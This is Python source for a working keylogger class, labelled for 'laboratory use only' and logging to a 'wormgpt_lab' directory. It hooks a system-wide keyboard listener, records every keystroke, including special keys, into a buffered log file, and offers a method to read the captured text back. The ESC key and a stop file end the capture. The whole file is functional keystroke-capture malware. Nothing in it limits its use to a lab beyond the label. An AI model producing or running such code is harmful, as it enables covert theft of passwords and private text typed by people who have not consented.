class LaboratoryKeylogger:
    """
    Keylogger for LABORATORY USE ONLY.
    Logs keystrokes to a file in /tmp/wormgpt_lab/logs/
    Can be stopped by creating a stop file or pressing ESC.
    """
    
    def __init__(self, log_file=None):
        self.log_file = log_file or LOG_DIR / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.current_keys = []
        self.running = True
        self.stop_signal = LAB_DIR / "stop_keylogger"
        
    def on_press(self, key):
        """Called when a key is pressed"""
        if not self.running:
            return False
        
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.current_keys.append(key.char)
            elif key == keyboard.Key.space:
                self.current_keys.append(' ')
            elif key == keyboard.Key.enter:
                self.current_keys.append('\n')
                self.flush()
            elif key == keyboard.Key.backspace:
                if self.current_keys:
                    self.current_keys.pop()
                self.current_keys.append('[BACKSPACE]')
            elif key == keyboard.Key.tab:
                self.current_keys.append('[TAB]')
            elif key == keyboard.Key.esc:
                print("\n[!] ESC pressed - stopping keylogger")
                self.running = False
                return False
            else:
                self.current_keys.append(f'[{key.name.upper()}]')
        except Exception as e:
            self.current_keys.append(f'[ERROR: {e}]')
        
        # Flush every 50 characters
        if len(self.current_keys) > 50:
            self.flush()
        
        return True
    
    def flush(self):
        """Write buffered keys to file"""
        if self.current_keys:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.current_keys))
            self.current_keys = []
    
    def start(self):
        """Start the keylogger"""
        print(f"\n[🔴 KEYLOGGER] Started")
        print(f"  Log file: {self.log_file}")
        print(f"  Press ESC to stop")
        print(f"  Or create file: {self.stop_signal}")
        
        # Check for stop signal in separate thread
        def check_stop_signal():
            while self.running:
                if self.stop_signal.exists():
                    print(f"\n[!] Stop signal detected - stopping keylogger")
                    self.running = False
                    break
                time.sleep(1)
        
        stop_thread = threading.Thread(target=check_stop_signal, daemon=True)
        stop_thread.start()
        
        # Start listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except:
                pass
        
        self.flush()
        print(f"\n[✅ KEYLOGGER] Stopped. Log saved to {self.log_file}")
        return self.log_file
    
    def read_logs(self):
        """Read captured keystrokes"""
        if self.log_file.exists():
            with open(self.log_file, 'r') as f:
                return f.read()
        return ""
